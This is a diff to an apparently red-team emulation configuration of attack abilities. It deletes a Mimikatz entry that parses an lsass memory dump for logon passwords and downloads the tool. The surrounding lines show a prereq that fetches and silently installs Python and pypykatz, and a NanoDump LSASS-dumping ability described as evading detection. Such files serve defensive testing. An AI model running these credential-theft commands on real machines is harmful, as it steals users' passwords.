@@ -71,13 +71,6 @@
             "win_prereq": "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe' -OutFile 'C:\\Users\\Public\\python_setup.exe'; Start-Process -FilePath 'C:\\Users\\Public\\python_setup.exe' -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1 Include_test=0' -Wait; Remove-Item 'C:\\Users\\Public\\python_setup.exe' -Force; $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User'); pip install pypykatz"
           },
           {
-            "ability_id": "7e8ccbe3de961012b6464485829e87a4",
-            "name": "Offline Credential Theft With Mimikatz",
-            "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with\nMimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\n",
-            "command": "\"C:\\Users\\Public\\x64\\mimikatz.exe\" \"sekurlsa::minidump %tmp%\\lsass.DMP\" \"sekurlsa::logonpasswords full\" exit",
-            "win_prereq": "if (Test-Path \"C:\\Users\\Public\\x64\\mimikatz.exe\") { Write-Host \"ALREADY_PRESENT: C:\\Users\\Public\\x64\\mimikatz.exe\" } else { New-Item -ItemType Directory -Force -Path 'C:\\Users\\Public\\x64'; Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip' -OutFile 'C:\\Users\\Public\\payload.zip'; Expand-Archive -Path 'C:\\Users\\Public\\payload.zip' -DestinationPath 'C:\\Users\\Public\\payload_extract' -Force; Copy-Item 'C:\\Users\\Public\\payload_extract\\x64\\mimikatz.exe' 'C:\\Users\\Public\\x64\\mimikatz.exe' -Force; Remove-Item 'C:\\Users\\Public\\payload.zip' -Force; Remove-Item 'C:\\Users\\Public\\payload_extract' -Recurse -Force }"
-          },
-          {
             "ability_id": "990a4629d154622098b70ba50384051f",
             "name": "Dump LSASS.exe Memory using NanoDump",
             "description": "The NanoDump tool uses syscalls and an invalid dump signature to avoid detection.\n\nhttps://github.com/helpsystems/nanodump\n\nUpon successful execution, you should find the nanondump.dmp file in the temp directory\n",
